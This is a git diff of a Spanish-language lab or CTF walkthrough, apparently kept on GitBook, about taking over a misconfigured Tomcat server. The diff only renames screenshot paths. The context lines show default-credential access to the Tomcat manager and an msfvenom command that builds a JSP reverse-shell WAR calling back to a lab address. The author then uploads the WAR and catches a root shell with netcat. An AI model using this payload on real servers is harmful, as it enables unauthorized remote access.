@@ -18,7 +18,7 @@ Hay un servicio web `Tomcat` corriendo en el puerto 8080. Vemos que en el servic
 
 <figure><img src="../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Parece que se han dejado el TomCat sin configurar. Si intentamos acceder al manager del Tomcat, nos muestra esto:
 
@@ -30,11 +30,11 @@ Aquí creo que hay un pequeño error, puesto que una contraseña por defecto sue
 
 Una vez introducido el usuario y contraseña en el directorio `/manager/html`, podemos acceder al directorio.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que hay una sección donde podemos subir nuestra propia aplicación al Tomcat.
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## 🚪 Ganando acceso
 
@@ -46,10 +46,10 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=9999 -f war > reve
 
 Después de subirla desde la sección mostrada anteriormente, aparece en la lista de aplicaciones.
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nos ponemos a la escucha con netcat desde nuestra máquina y ejecutamos la aplicación (con darle click al vínculo de la primera columna de la tabla de aplicaciones, basta).
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Hemos conseguido acceso como `root` directo, por lo que no necesitamos escalar privilegios.
